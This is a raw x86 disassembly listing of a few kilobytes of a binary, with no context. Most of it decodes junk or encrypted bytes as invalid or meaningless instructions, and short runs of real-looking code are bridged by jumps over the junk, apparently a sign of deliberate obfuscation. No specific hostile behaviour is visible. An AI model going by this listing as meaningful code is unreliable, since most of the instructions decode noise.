  429f09:	fnstcw WORD PTR [edi]
  429f0b:	xor    esp,DWORD PTR [edi+0x5f]
  429f0e:	add    eax,0xf037a103
  429f13:	add    DWORD PTR [eax],eax
  429f15:	ret    
  429f16:	add    BYTE PTR [eax],al
  429f18:	add    BYTE PTR [esi+ebx*2-0x36d196dc],dh
  429f1f:	pop    ebx
  429f20:	dec    ebp
  429f21:	inc    edi
  429f22:	sub    al,0xa3
  429f24:	pop    es
  429f25:	mov    al,0xdb
  429f27:	sub    DWORD PTR [edx],edi
  429f29:	jmp    0x2504f025
  429f2e:	pop    esi
  429f2f:	neg    bl
  429f31:	pop    ebp
  429f32:	out    dx,eax
  429f33:	push   eax
  429f34:	(bad)  
  429f35:	hlt    
  429f36:	ja     0x429f0f
  429f38:	iret   
  429f39:	xchg   ebx,eax
  429f3a:	add    edi,DWORD PTR [ecx-0x33]
  429f3d:	inc    edi
  429f3e:	push   0x70
  429f40:	in     al,dx
  429f41:	retf   0xc7f4
  429f44:	dec    ecx
  429f45:	retf   
  429f46:	pop    edx
  429f47:	(bad)  
  429f48:	lock mov eax,0x897917f1
  429f4e:	mov    bl,BYTE PTR [esi+0x7c]
  429f51:	jle    0x429eed
  429f53:	or     al,0xb9
  429f56:	mov    dh,0xbf
  429f58:	mov    bh,0x19
  429f5a:	and    bl,BYTE PTR [ebx+ecx*1-0x59f38b3a]
  429f61:	and    DWORD PTR [eax],0xe4160d66
  429f67:	sbb    edi,esi
  429f69:	imul   DWORD PTR [ebx+0x7a7dcd6c]
  429f6f:	sbb    al,0x92
  429f71:	add    dl,dh
  429f73:	jne    0x429f4f
  429f75:	in     al,dx
  429f76:	xor    al,0x7a
  429f78:	(bad)  
  429f79:	push   esi
  429f7a:	jno    0x429fa6
  429f7c:	mov    ss,WORD PTR [edx-0x2cde8f83]
  429f82:	aad    0xe7
  429f84:	sahf   
  429f85:	xor    eax,0x5b10bfc2
  429f8a:	pusha  
  429f8b:	call   0x46cf:0xd45755a
  429f92:	leave  
  429f93:	jo     0x429fa4
  429f95:	repnz push es
  429f97:	jbe    0x429fbe
  429f99:	sahf   
  429f9a:	add    edx,DWORD PTR [ebp-0x2011f8af]
  429fa0:	pop    eax
  429fa1:	stos   DWORD PTR es:[edi],eax
  429fa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429fa3:	mov    esi,0x31ed50cb
  429fa8:	popa   
  429fa9:	mov    esp,0x327339c6
  429fae:	pop    ecx
  429faf:	out    dx,al
  429fb0:	scas   al,BYTE PTR es:[edi]
  429fb1:	or     eax,DWORD PTR [eax-0xe60ed6f]
  429fb7:	jecxz  0x429f3e
  429fb9:	sbb    DWORD PTR [ebx],edx
  429fbb:	into   
  429fbc:	repnz inc edx
  429fbe:	dec    ebx
  429fbf:	in     eax,dx
  429fc0:	das    
  429fc1:	cmp    eax,0x375afea6
  429fc6:	loopne 0x429fc3
  429fc8:	cmp    edi,DWORD PTR [esi-0x1d]
  429fcb:	int    0x3b
  429fcd:	mov    ah,0x1c
  429fcf:	jmpw   0xb3a4
  429fd3:	repnz adc eax,DWORD PTR [esi-0x17c64c95]
  429fda:	xchg   BYTE PTR [esi-0x8ddc47],dh
  429fe0:	(bad)  
  429fe1:	jmp    0x42a0c1
  429fe6:	fwait
  429fe7:	popaw  
  429fe9:	xchg   esp,eax
  429fea:	std    
  429feb:	xchg   edi,eax
  429fec:	jmp    FWORD PTR [edi+0x4]
  429fef:	call   0xbf54:0xb56da117
  429ff6:	cli    
  429ff7:	lock add DWORD PTR [eax],eax
  429ffa:	ret    
  429ffb:	add    BYTE PTR [eax],al
  429ffd:	add    BYTE PTR [edi-0x1],dl
  42a000:	scas   eax,DWORD PTR es:[edi]
  42a001:	xlat   BYTE PTR ds:[ebx]
  42a002:	popa   
  42a003:	dec    edx
  42a004:	jl     0x429fb2
  42a006:	call   0x8f83:0x3ccafc64
  42a00d:	popa   
  42a00e:	push   0xf1f8a2f0
  42a013:	inc    edx
  42a014:	jno    0x42a054
  42a016:	ror    BYTE PTR [esi-0x7c],cl
  42a019:	xchg   esi,edx
  42a01b:	inc    esi
  42a01c:	cvtps2pd xmm2,QWORD PTR [edi]
  42a01f:	cmp    DWORD PTR [esi-0x7f71c7c9],edx
  42a025:	jle    0x42a00c
  42a027:	sahf   
  42a028:	aas    
  42a029:	into   
  42a02a:	pop    ebp
  42a02b:	lods   eax,DWORD PTR ds:[esi]
  42a02c:	in     eax,dx
  42a02d:	(bad)  
  42a02e:	test   eax,0xdf7ddfa7
  42a033:	mov    edi,DWORD PTR [edx]
  42a035:	fbld   TBYTE PTR [ecx]
  42a037:	ins    BYTE PTR es:[edi],dx
  42a038:	mov    bh,0xe9
  42a03a:	shr    DWORD PTR [edi-0x11c3b161],1
  42a040:	lds    ebp,FWORD PTR [esi]
  42a042:	lds    ebp,FWORD PTR [ecx+0x37]
  42a045:	sbb    esp,DWORD PTR [eax-0x58]
  42a048:	inc    edi
  42a049:	dec    ecx
  42a04a:	test   al,0x72
  42a04c:	dec    edx
  42a04d:	jp     0x42a069
  42a04f:	adc    al,0x82
  42a051:	das    
  42a052:	lock or al,0xec
  42a055:	mov    dl,0x6c
  42a057:	and    DWORD PTR ds:0xf0d7a7cc,eax
  42a05d:	inc    ecx
  42a05e:	(bad)  
  42a05f:	jnp    0x42a029
  42a061:	in     al,0x51
  42a063:	or     edx,ebp
  42a065:	cmp    eax,0x207ec6a
  42a06a:	push   edi
  42a06b:	pusha  
  42a06c:	inc    ecx
  42a06d:	pushf  
  42a06e:	push   esi
  42a06f:	adc    al,0xf7
  42a071:	aam    0x2d
  42a073:	fs enter 0x650c,0xf9
  42a078:	xchg   esi,eax
  42a079:	mov    esp,0xb629a358
  42a07e:	ret    0x216b
  42a081:	mov    al,ds:0xd68f139e
  42a086:	dec    ebx
  42a087:	inc    eax
  42a088:	(bad)  
  42a089:	mov    ebx,0x361e2a44
  42a08e:	push   ds
  42a08f:	fild   QWORD PTR [eax+0x42b189b9]
  42a095:	in     al,0xb3
  42a097:	xchg   ecx,eax
  42a098:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a09a:	adc    al,BYTE PTR [esi-0x54]
  42a09d:	fmul   DWORD PTR [esi-0x4be6d268]
  42a0a3:	mov    al,ds:0xe31f7451
  42a0a8:	icebp  
  42a0a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a0aa:	les    esi,FWORD PTR ds:0xe27fe517
  42a0b0:	retf   
  42a0b1:	cld    
  42a0b2:	sub    esi,DWORD PTR [eax-0x1e5b2e34]
  42a0b8:	pop    ds
  42a0b9:	push   esi
  42a0ba:	push   ds
  42a0bb:	push   ds
  42a0bc:	arpl   WORD PTR [ecx+0x13c39fc8],cx
  42a0c2:	shr    ecx,1
  42a0c4:	fild   DWORD PTR [eax]
  42a0c6:	add    BYTE PTR [eax],al
  42a0c8:	adc    ebx,DWORD PTR [edx-0x644a6cd]
  42a0ce:	jnp    0x42a0aa
  42a0d0:	rcl    DWORD PTR [edx-0x24],1
  42a0d3:	mov    eax,ds:0x33f775a1
  42a0d8:	mov    ebp,0xc30001f1
  42a0dd:	add    BYTE PTR [eax],al
  42a0df:	add    cl,cl
  42a0e1:	lds    esp,FWORD PTR [eax+0x30]
  42a0e4:	adc    DWORD PTR [ebx],ecx
  42a0e6:	xor    ah,cl
  42a0e8:	outs   dx,BYTE PTR ds:[esi]
  42a0e9:	popf   
  42a0ea:	pop    ebx
  42a0eb:	in     eax,dx
  42a0ec:	and    al,0x88
  42a0ee:	(bad)  
  42a0ef:	ds in  al,dx
  42a0f1:	mov    ?,WORD PTR [ecx+0x72]
  42a0f4:	jae    0x42a133
  42a0f6:	sahf   
  42a0f7:	pop    esp
  42a0f8:	inc    esp
  42a0f9:	mov    edx,0x8d5e8bba
  42a0fe:	add    BYTE PTR [ecx],bh
  42a100:	mov    al,es:0xbd0f64a
  42a106:	cmp    eax,0x6fbe866
  42a10b:	clc    
  42a10c:	cmc    
  42a10d:	dec    edi
  42a10e:	and    al,0xed
  42a110:	xor    bh,bl
  42a112:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  42a114:	imul   edi,DWORD PTR [esi+0x5e6a3921],0x16
  42a11b:	xchg   edi,eax
  42a11c:	repnz pop edx
  42a11e:	jno    0x42a135
  42a120:	dec    ebx
  42a121:	(bad)  
  42a122:	into   
  42a123:	repz or al,0x3e
  42a126:	cmp    al,0xa0
  42a128:	enter  0xd1ff,0xb1
  42a12c:	or     eax,0x407a1646
  42a131:	cli    
  42a132:	aas    
  42a133:	lods   al,BYTE PTR ds:[esi]
  42a134:	mov    ds:0x7dd97889,eax
  42a139:	ss hlt 
  42a13b:	dec    ecx
  42a13c:	or     DWORD PTR [esi],esi
  42a13e:	mov    ecx,0xe58db2f2
  42a143:	jg     0x42a13b
  42a145:	bound  eax,QWORD PTR [ecx-0x17]
  42a148:	inc    edi
  42a149:	inc    esi
  42a14a:	aas    
  42a14b:	test   eax,0x87f783dd
  42a150:	icebp  
  42a151:	div    DWORD PTR [eax]
  42a153:	sti    
  42a154:	and    BYTE PTR [ebx+0x43d1e3cd],0x89
  42a15b:	aas    
  42a15c:	(bad)
  42a160:	xchg   esp,eax
  42a161:	enter  0xb40d,0x44
  42a165:	lods   eax,DWORD PTR ds:[esi]
  42a166:	stos   BYTE PTR es:[edi],al
  42a167:	xchg   esp,eax
  42a168:	jge    0x42a14e
  42a16a:	leave  
  42a16b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a16c:	pop    edi
  42a16d:	(bad)  
  42a16f:	push   ds
  42a170:	add    ecx,ebp
  42a172:	xchg   BYTE PTR [esi-0x12a2cfd6],ah
  42a178:	adc    DWORD PTR [edx+0x4d],edx
  42a17b:	ja     0x42a1f1
  42a17d:	cs scas al,BYTE PTR es:[edi]
  42a17f:	call   0x6bc7e5a
  42a184:	mov    BYTE PTR [eax-0x1b56737b],ch
  42a18a:	pop    ebp
  42a18b:	icebp  
  42a18c:	push   0x7f
  42a18e:	mov    eax,ds:0x7bbbcb37
  42a193:	(bad)  [edx]
  42a195:	xchg   esi,eax
  42a196:	inc    ecx
  42a197:	mov    bl,0x1b
  42a199:	lods   al,BYTE PTR ds:[esi]
  42a19a:	lods   al,BYTE PTR ds:[esi]
  42a19b:	sub    eax,0x1f34847
  42a1a0:	xchg   ebx,eax
  42a1a1:	sub    ch,BYTE PTR [ecx+0xacffbb]
  42a1a7:	add    cl,ch
  42a1a9:	fild   DWORD PTR [eax]
  42a1ab:	add    BYTE PTR [eax],al
  42a1ad:	sub    al,0x39
  42a1af:	and    eax,0x6d5c3540
  42a1b4:	jge    0x42a18c
  42a1b6:	xchg   ebx,eax
  42a1b7:	mov    eax,0x5c2bfa9f
  42a1bc:	mov    edi,0x1f280
  42a1c1:	ret    
  42a1c2:	add    BYTE PTR [eax],al
  42a1c4:	add    ah,cl
  42a1c6:	mov    cl,0x70
  42a1c8:	lods   al,BYTE PTR ds:[esi]
  42a1c9:	gs ins DWORD PTR es:[edi],dx
  42a1cb:	das    
  42a1cc:	outs   dx,DWORD PTR ds:[esi]
  42a1cd:	cmovns ebp,DWORD PTR [ecx-0x7916e148]
  42a1d4:	bound  esi,QWORD PTR [ecx]
  42a1d6:	sbb    dh,BYTE PTR [ecx+0x2598159c]
  42a1dc:	inc    eax
  42a1dd:	or     DWORD PTR [edi],eax
  42a1df:	clc    
  42a1e0:	shr    dh,0x6c
  42a1e3:	and    ebx,DWORD PTR [ecx]
  42a1e5:	dec    esi
  42a1e6:	leave  
  42a1e7:	adc    bh,BYTE PTR [ebx-0x4e]
  42a1ea:	addr16 and al,0x78
  42a1ed:	imul   esi,ebx,0x34
  42a1f0:	mov    cl,0x6d
  42a1f2:	lea    ebp,[edx+0x64]
  42a1f5:	loope  0x42a1f6
  42a1f7:	adc    bl,BYTE PTR [edx-0x53]
  42a1fa:	cld    
  42a1fb:	addr16 push 0x9cb7ca37
  42a201:	fnsave [esi]
  42a203:	mov    WORD PTR [esi-0x6e],es
  42a206:	mov    DWORD PTR [ebp+0x7f],ebp
  42a209:	loope  0x42a1e0
  42a20b:	jg     0x42a234
  42a20d:	mov    eax,0xab5b8cf5
  42a212:	pop    ebx
  42a213:	pop    es
  42a214:	(bad)
  42a218:	out    0x9e,al
  42a21a:	pushf  
  42a21b:	sbb    ecx,DWORD PTR [edx]
  42a21d:	add    eax,0xfbe70ea1
  42a222:	mov    ecx,DWORD PTR [eax+0x1f9a5280]
  42a228:	(bad)  
  42a229:	icebp  
  42a22a:	xchg   esi,eax
  42a22b:	add    DWORD PTR [ecx],edi
  42a22d:	out    0x2,al
  42a22f:	rcl    DWORD PTR [edx],0xb
  42a232:	jne    0x42a2ae
  42a234:	pop    ds
  42a235:	sbb    dh,cl
  42a237:	into   
  42a238:	imul   DWORD PTR [ebp-0x4c6b4685]
  42a23e:	mov    ah,ch
  42a240:	cmp    esp,esi
  42a242:	dec    eax
  42a243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a244:	int3   
  42a245:	frstor [edi+esi*8]
  42a248:	in     eax,0xb4
  42a24a:	push   ebx
  42a24b:	bt     DWORD PTR [ecx],ebp
  42a24e:	ror    BYTE PTR [edi+0x346e62ac],cl
  42a254:	(bad)  
  42a255:	mov    ?,WORD PTR [esi-0x75]
  42a258:	jl     0x42a276
  42a25a:	clc    
  42a25b:	mov    ebp,0x497f4e68
  42a260:	push   ebp
  42a261:	repnz inc edx
  42a263:	in     eax,0x11
  42a265:	or     al,BYTE PTR [ebx]
  42a267:	nop
  42a268:	mov    cl,0x61
  42a26a:	add    al,0xe0
  42a26c:	xor    cl,BYTE PTR [ecx-0x6b135cb0]
  42a272:	stc    
  42a273:	adc    al,0x25
  42a275:	test   al,0xf4
  42a277:	push   esp
  42a278:	scas   al,BYTE PTR es:[edi]
  42a279:	fsubr  DWORD PTR ds:0x93498dd8
  42a27f:	xchg   edx,eax
  42a280:	or     al,0xbf
  42a282:	out    0x6b,al
  42a284:	mov    edi,0x33efb069
  42a289:	ror    DWORD PTR [ecx-0x74dbdbac],cl
  42a28f:	push   esp
  42a290:	and    al,0x10
  42a292:	mov    DWORD PTR [esp+0x18],edx
  42a296:	jmp    0x42a376
  42a29b:	mov    ah,0xef
  42a29d:	or     eax,0xfff65ff6
  42a2a2:	out    dx,eax
  42a2a3:	mov    cl,0xe6
  42a2a5:	jl     0x42a246
  42a2a7:	call   0x4401b01f
  42a2ac:	repz add DWORD PTR [eax],eax
  42a2af:	ret    
  42a2b0:	add    BYTE PTR [eax],al
  42a2b2:	add    BYTE PTR [edx+0x4f],al
  42a2b5:	retf   
  42a2b6:	xlat   BYTE PTR ds:[ebx]
  42a2b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a2b8:	jbe    0x42a322
  42a2ba:	mov    DWORD PTR ds:0xcf7993e4,edi
  42a2c0:	test   al,0x36
  42a2c2:	sub    bh,ch
  42a2c4:	mov    eax,0x606286be
  42a2c9:	or     al,bh
  42a2cb:	popa   
  42a2cc:	adc    esi,edx
  42a2ce:	clc    
  42a2cf:	ret    0x5c62
  42a2d2:	adc    al,0x35
  42a2d4:	fwait
  42a2d5:	pop    ss
  42a2d6:	inc    esi
  42a2d7:	cdq    
  42a2d8:	pushf  
  42a2d9:	dec    edi
  42a2da:	xchg   ebx,edi
  42a2dc:	or     edx,DWORD PTR [ebp+0x59e45b3c]
  42a2e2:	push   ebx
  42a2e3:	jb     0x42a340
  42a2e5:	int3   
  42a2e6:	stos   DWORD PTR es:[edi],eax
  42a2e7:	or     eax,0xeac24d2c
  42a2ec:	add    BYTE PTR [edx-0x1a],0x52
  42a2f0:	lds    ecx,FWORD PTR [ecx-0x513222ad]
  42a2f6:	xor    ah,dl
  42a2f8:	mov    esi,0x6cdd4ad3
  42a2fd:	push   0xe6a7ccb0
  42a302:	cli    
  42a303:	scas   eax,DWORD PTR es:[edi]
  42a304:	rol    DWORD PTR [edx-0x3e],cl
  42a307:	scas   eax,DWORD PTR es:[edi]
  42a308:	addr16 mov ah,0xf5
  42a30b:	dec    eax
  42a30c:	mov    edi,0x1ebb4469
  42a311:	cmp    dl,BYTE PTR [ecx]
  42a313:	loop   0x42a376
  42a315:	push   esp
  42a316:	ret    
  42a317:	cmp    eax,DWORD PTR [ebp+0x67]
  42a31a:	jp     0x42a393
  42a31c:	mov    ebp,ecx
  42a31e:	popa   
  42a31f:	iret   
  42a320:	repnz push ds
  42a322:	inc    esp
  42a323:	adc    esi,0xdf9b334c
  42a329:	push   esi
  42a32a:	add    bl,BYTE PTR [ecx+edx*4-0x26ea1df5]
  42a331:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a332:	xor    esi,eax
  42a334:	push   cs
  42a335:	push   ss
  42a336:	mov    ds:0xf55fdf76,al
  42a33b:	xchg   ebp,eax
  42a33c:	pop    ss
  42a33d:	pushf  
  42a33e:	cmp    DWORD PTR [edx-0x6e0ad290],edi
  42a344:	push   ebx
  42a345:	jge    0x42a2fe
  42a347:	xchg   DWORD PTR [esi+0x29],esp
  42a34a:	pop    edi
  42a34b:	ror    DWORD PTR [edx-0x7f23962c],1
  42a351:	jnp    0x42a3b1
  42a353:	in     eax,dx
  42a354:	and    ebp,DWORD PTR [edx]
  42a356:	xlat   BYTE PTR ds:[ebx]
  42a357:	sbb    eax,eax
  42a359:	jnp    0x42a2f4
  42a35b:	xor    DWORD PTR [edi-0x24af23a7],0x5b
  42a362:	mov    bh,0x4d
  42a364:	aam    0x23
  42a366:	dec    ebx
  42a367:	into   
  42a368:	out    0x45,al
  42a36a:	add    DWORD PTR [ecx-0x2a],esp
  42a36d:	ins    DWORD PTR es:[edi],dx
  42a36e:	fidivr WORD PTR [esi]
  42a370:	lahf   
  42a371:	xchg   esp,eax
  42a372:	pop    esp
  42a373:	xor    ecx,ebx
  42a375:	or     ecx,DWORD PTR [ebx+0x33142454]
  42a37b:	(bad)  
  42a37c:	mov    DWORD PTR [esp+0x1c],edx
  42a380:	cmp    eax,DWORD PTR [esp+0x18]
  42a384:	jne    0x42a396
  42a38a:	mov    eax,edx
  42a38c:	cmp    DWORD PTR [esp+0x24],eax
  42a390:	je     0x42cb72
  42a396:	mov    eax,DWORD PTR [esp+0x64]
  42a39a:	jmp    0x42a47a
  42a39f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a3a0:	cmp    al,0xf
  42a3a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a3a3:	lahf   
  42a3a4:	mov    bh,0xaf
  42a3a6:	cmp    al,0xb4
  42a3a8:	std    
  42a3a9:	inc    edx
  42a3aa:	add    cl,BYTE PTR [ecx+0x6cd61ed]
  42a3b0:	hlt    
  42a3b1:	add    DWORD PTR [eax],eax
  42a3b3:	ret    
  42a3b4:	add    BYTE PTR [eax],al
  42a3b6:	add    BYTE PTR [ecx],ch
  42a3b8:	aaa    
  42a3b9:	jge    0x42a424
  42a3bb:	jae    0x42a355
  42a3bd:	addr16 icebp 
  42a3bf:	jns    0x42a3ab
  42a3c1:	add    esi,eax
  42a3c3:	adc    ch,BYTE PTR [eax+0x765bbd16]
  42a3c9:	hlt    
  42a3ca:	sti    
  42a3cb:	and    al,0x34
  42a3cd:	gs inc eax
  42a3cf:	xor    DWORD PTR [ebp+ecx*8-0x1a59702f],0x4104d190
  42a3da:	inc    ecx
  42a3db:	fbld   TBYTE PTR [edi]
  42a3dd:	push   esp
  42a3de:	adc    BYTE PTR [ecx],dl
  42a3e0:	into   
  42a3e1:	inc    eax
  42a3e2:	add    esp,esp
  42a3e4:	sbb    eax,0x3424b8db
  42a3e9:	(bad)  
  42a3ea:	mov    al,0xc
  42a3ec:	push   esp
  42a3ed:	jb     0x42a3e1
  42a3ef:	add    al,0xe3
  42a3f1:	shl    eax,0x1
  42a3f4:	(bad)  
  42a3f5:	push   esp
  42a3f6:	ins    DWORD PTR es:[edi],dx
  42a3f7:	ins    BYTE PTR es:[edi],dx
  42a3f8:	outs   dx,DWORD PTR ds:[esi]
  42a3f9:	jg     0x42a3ed
  42a3fb:	popa   
  42a3fc:	jg     0x42a37f
  42a3fe:	sar    edx,0x53
  42a401:	jmp    0x7fd30445
  42a406:	pop    ecx
  42a407:	jns    0x42a3a8
  42a409:	pop    eax
  42a40a:	mov    bl,0x56
  42a40c:	pop    ss
  42a40d:	mov    ah,0xe7
  42a40f:	fcomp  QWORD PTR [esi-0x1f]
  42a412:	push   edi
  42a413:	and    ah,dh
  42a415:	mov    BYTE PTR [edi+0x59],dl
  42a418:	mov    bh,0xef
  42a41a:	sub    cl,BYTE PTR [esi]
  42a41c:	jae    0x42a487
  42a41e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a41f:	xor    eax,DWORD PTR [ebx]
  42a421:	outs   dx,BYTE PTR ds:[esi]
  42a422:	pop    es
  42a423:	and    al,0x3e
  42a425:	shl    al,1
  42a427:	test   DWORD PTR [edx-0x73],ebx
  42a42a:	sbb    al,0x3a
  42a42c:	mov    dh,0x58
  42a42e:	pop    es
  42a42f:	add    DWORD PTR [eax+0x59],edi
  42a432:	enter  0x656a,0xce
  42a436:	test   eax,0xa7e7cc5e
  42a43b:	jb     0x42a419
  42a43d:	or     dl,bh
  42a43f:	jae    0x42a3c1
  42a441:	push   es
  42a442:	sub    al,0xa
  42a444:	mov    BYTE PTR [eax+0x38],0xcc
  42a448:	cmp    cl,cl
  42a44a:	sbb    ebp,esp
  42a44c:	cdq    
  42a44d:	neg    DWORD PTR [ecx+ebx*4+0x568591fe]
  42a454:	int3   
  42a455:	sbb    al,0x8e
  42a457:	add    ecx,DWORD PTR [edi+ebx*2]
  42a45a:	(bad)  
  42a45b:	sbb    al,0xe0
  42a45d:	scas   eax,DWORD PTR es:[edi]
  42a45e:	xchg   esp,eax
  42a45f:	jle    0x42a415
  42a461:	xor    ah,0x34
  42a464:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a465:	push   0xffffffe4
  42a467:	(bad)  
  42a468:	jecxz  0x42a400
  42a46a:	lds    ebx,FWORD PTR [eax]
  42a46c:	es inc edx
  42a46e:	pop    ecx
  42a46f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a470:	sbb    eax,0x1d359bfc
  42a475:	mov    DWORD PTR [ebx+0x7f],0x548b2cde
  42a47c:	and    al,0x64
  42a47e:	sub    eax,0x7511
  42a483:	jmp    0x42a563
  42a488:	sub    dl,ah
  42a48a:	in     eax,0x85
  42a48c:	push   DWORD PTR [ebp+0x7e2bff6a]
  42a492:	jne    0x42a433
  42a494:	aad    0xc4
  42a496:	mov    bh,0x3f
  42a498:	leave  
  42a499:	hlt    
  42a49a:	add    DWORD PTR [eax],eax
  42a49c:	ret    
  42a49d:	add    BYTE PTR [eax],al
  42a49f:	add    BYTE PTR [ecx],ah
  42a4a1:	dec    esi
  42a4a2:	or     DWORD PTR [ebx],ecx
  42a4a4:	pop    ss
  42a4a5:	pop    esp
  42a4a6:	mov    dl,0xe7
  42a4a8:	mov    cl,0xea
  42a4aa:	add    bl,al
  42a4ac:	mov    ah,0x9d
  42a4ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a4af:	ret    0xd701
  42a4b2:	adc    DWORD PTR [eax+edx*8-0xf],esp
  42a4b6:	cdq    
  42a4b7:	push   edi
  42a4b8:	dec    eax
  42a4b9:	push   edi
  42a4ba:	sti    
  42a4bb:	rcr    BYTE PTR [edi+0x3084adc8],0x75
  42a4c2:	adc    BYTE PTR [ecx],0x63
  42a4c5:	test   al,0xe6
  42a4c7:	cmp    ecx,ebx
  42a4c9:	jno    0x42a475
  42a4cb:	repz jge 0x42a4aa
  42a4ce:	and    eax,0x76bccc45
  42a4d3:	test   DWORD PTR [ebx+0x61],0x3cef71df
  42a4da:	(bad)  
  42a4db:	sbb    ch,BYTE PTR [ecx-0x52]
  42a4de:	lea    ebp,[ecx-0x419df6cc]
  42a4e4:	mov    al,ds:0x4b331927
  42a4e9:	daa    
  42a4ea:	clc    
  42a4eb:	push   ebp
  42a4ec:	test   DWORD PTR [ebp+0x4f],ebx
  42a4ef:	mov    cl,BYTE PTR [ebp+0x61]
  42a4f2:	iret   
  42a4f3:	cwde   
  42a4f4:	adc    edi,esp
  42a4f6:	cmp    BYTE PTR [esi+0x64228e91],ch
  42a4fc:	mov    ebx,0x5cdc69aa
  42a501:	inc    edx
  42a502:	sub    BYTE PTR [eax+0x55575c60],cl
  42a508:	mov    ds:0x7579b17b,eax
  42a50d:	pop    ss
  42a50e:	leave  
  42a50f:	nop
  42a510:	arpl   dx,sp
  42a512:	dec    esi
  42a513:	adc    eax,0xce99b8af
  42a518:	mov    ebx,0x86aee941
  42a51d:	into   
  42a51e:	outs   dx,DWORD PTR ds:[esi]
  42a51f:	pushf  
  42a520:	in     al,dx
  42a521:	mov    ds:0x9514fa50,eax
  42a526:	inc    ebp
  42a527:	stc    
  42a528:	jg     0x42a540
  42a52a:	and    al,0xc3
  42a52c:	jecxz  0x42a5a9
  42a52e:	jno    0x42a4d0
  42a530:	jae    0x42a568
  42a532:	(bad)  
  42a534:	das    
  42a535:	aas    
  42a536:	sbb    edx,edi
  42a538:	jmp    0x8339618f
  42a53d:	or     DWORD PTR [ecx+0x15340d4e],ecx
  42a543:	out    0xa7,eax
  42a545:	xchg   ecx,eax
  42a546:	nop
  42a547:	push   0xf39fdf2f
  42a54c:	(bad)  
  42a54e:	cmp    al,0xce
  42a550:	int3   
  42a551:	sub    bh,BYTE PTR [ebp-0x36977c]
  42a557:	mov    ch,0x97
  42a559:	nop
  42a55a:	sbb    eax,0x8334bbbb
  42a55f:	jo     0x42a513
  42a561:	pop    ecx
  42a562:	xchg   esp,eax
  42a563:	sub    edx,0x3cf87511
  42a569:	xor    eax,0x59c9
  42a56e:	xor    edx,0x78e20000
  42a574:	shr    edx,0x10
  42a577:	shl    eax,0x10
  42a57a:	or     eax,edx
  42a57c:	add    eax,0xc3078aef
  42a581:	xor    edx,edx
  42a583:	jmp    0x42a663
  42a588:	and    edx,0xfe7b7438
  42a58e:	int    0xf7
  42a590:	lock mov ebp,0x57bb9f04
  42a596:	jns    0x42a564
  42a598:	mov    ebp,?
  42a59a:	add    DWORD PTR [eax],eax
  42a59c:	ret    
  42a59d:	add    BYTE PTR [eax],al
  42a59f:	add    BYTE PTR [esi-0x5f],bh
  42a5a2:	call   0xcb3d7b00
  42a5a7:	stc    
  42a5a8:	ja     0x42a5b9
  42a5aa:	sub    esp,DWORD PTR [edx-0x6285a1e6]
  42a5b0:	mov    eax,ds:0xbfbc4fd
  42a5b5:	scas   al,BYTE PTR es:[edi]
  42a5b6:	fdivr  DWORD PTR [edi-0x3e915ed0]
  42a5bc:	(bad)  
  42a5bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a5be:	add    al,0xf9
  42a5c0:	mov    ebp,0xee277332
  42a5c5:	fidivr DWORD PTR ds:0x6cf4a74b
  42a5cb:	rcl    BYTE PTR [ecx+0x2310af2f],cl
  42a5d1:	clc    
  42a5d2:	mov    ah,BYTE PTR [edx+0x11]
  42a5d5:	pop    ss
  42a5d6:	enter  0x3f37,0x22
  42a5da:	test   BYTE PTR [esp+ebx*8+0x4d397638],al
  42a5e1:	sub    dh,dh
  42a5e3:	xchg   ebx,eax
  42a5e4:	in     eax,dx
  42a5e5:	popa   
  42a5e6:	and    cl,BYTE PTR [esi]
  42a5e8:	jbe    0x42a5ef
  42a5ea:	in     eax,0x19
  42a5ec:	mov    dl,0x67
  42a5ee:	adc    dh,bh
  42a5f0:	int3   
  42a5f1:	ret    
  42a5f2:	inc    ebx
  42a5f3:	pop    edi
  42a5f4:	aas    
  42a5f5:	aas    
  42a5f6:	mov    ch,0x11
  42a5f8:	hlt    
  42a5f9:	adc    BYTE PTR [ebx-0x385e3b19],bh
  42a5ff:	call   0x2cbaeb22
  42a604:	sub    BYTE PTR [esi-0x28f42b54],bh
  42a60a:	adc    eax,0x6a014fca
  42a60f:	xlat   BYTE PTR ds:[ebx]
  42a610:	push   edx
  42a611:	mov    WORD PTR [ebx-0x61],fs
  42a614:	rdmsr  
  42a616:	push   ebp
  42a617:	shl    DWORD PTR [edi+0x70ad5b53],0xce
  42a61e:	lea    edx,[ebp+0x1bf900dd]
  42a624:	pop    esi
  42a625:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a626:	pop    edi
  42a627:	sahf   
  42a628:	xchg   DWORD PTR [ebx],edi
  42a62a:	jns    0x42a69c
  42a62c:	aad    0x49
  42a62e:	dec    ebx
  42a62f:	add    BYTE PTR [ebp-0x62ed6b70],bh
  42a635:	cmp    ebx,DWORD PTR [eax-0x66f0c318]
  42a63b:	imul   edx,ebx,0xb
  42a63e:	and    al,0x2f
  42a640:	xlat   BYTE PTR ds:[ebx]
  42a641:	retf   0x696f
  42a644:	xchg   DWORD PTR [ecx],esi
  42a646:	fs je  0x42a659
  42a649:	mov    esi,eax
  42a64b:	and    eax,0x96743c86
  42a650:	inc    ebp
  42a651:	adc    BYTE PTR [edi+0x7a],bl
  42a654:	cwde   
  42a655:	push   ds
  42a656:	mov    ebp,edx
  42a658:	jb     0x42a642
  42a65a:	mov    WORD PTR [edi],cs
  42a65c:	stos   DWORD PTR es:[edi],eax
  42a65d:	xor    esi,esi
  42a65f:	adc    BYTE PTR [esp+ecx*1],dl
  42a662:	push   ds
  42a663:	add    eax,edi
  42a665:	adc    edx,ecx
  42a667:	xor    eax,esi
  42a669:	xor    edx,ebx
